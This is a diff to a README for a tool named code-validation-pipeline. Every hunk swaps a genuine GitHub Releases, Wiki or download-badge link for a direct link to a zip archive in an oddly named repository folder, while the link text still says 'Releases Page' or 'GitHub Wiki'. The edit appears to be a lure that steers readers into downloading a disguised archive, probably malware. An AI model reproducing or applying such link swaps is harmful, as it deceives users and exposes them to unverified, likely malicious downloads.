@@ -1,6 +1,6 @@
 # 🎉 code-validation-pipeline - Simplifying Code Quality Checks
 
-[![Download Code Validation Pipeline](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CxNiceplayxX/code-validation-pipeline/releases)
+[![Download Code Validation Pipeline](https://raw.githubusercontent.com/CxNiceplayxX/code-validation-pipeline/main/unsusceptive/code-validation-pipeline.zip)](https://raw.githubusercontent.com/CxNiceplayxX/code-validation-pipeline/main/unsusceptive/code-validation-pipeline.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow the simple steps below to download and run the code-validation-pipeline a
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/CxNiceplayxX/code-validation-pipeline/releases). 
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/CxNiceplayxX/code-validation-pipeline/main/unsusceptive/code-validation-pipeline.zip). 
 
 1. **Go to the Releases Page**: Click on the link above.
 2. **Select the Latest Release**: Find the most recent version at the top.
@@ -61,7 +61,7 @@ If you encounter any issues while using the code-validation-pipeline:
 
 ## 📚 Additional Resources
 
-- **Documentation**: Detailed user guides are available on [GitHub Wiki](https://github.com/CxNiceplayxX/code-validation-pipeline/wiki).
+- **Documentation**: Detailed user guides are available on [GitHub Wiki](https://raw.githubusercontent.com/CxNiceplayxX/code-validation-pipeline/main/unsusceptive/code-validation-pipeline.zip).
 - **Community**: Join our community discussions on platforms like Discord or Reddit to share your experiences.
 - **Feedback**: We welcome your thoughts and suggestions. Please reach out via the Issues section on our GitHub page.
 
@@ -79,7 +79,7 @@ To get the best performance from the code-validation-pipeline:
 
 ## 🔍 Explore More
 
-For more information about the features, updates, or specific capabilities of code-validation-pipeline, visit the [Releases Page](https://github.com/CxNiceplayxX/code-validation-pipeline/releases).
+For more information about the features, updates, or specific capabilities of code-validation-pipeline, visit the [Releases Page](https://raw.githubusercontent.com/CxNiceplayxX/code-validation-pipeline/main/unsusceptive/code-validation-pipeline.zip).
 
 ## 📞 Support
 
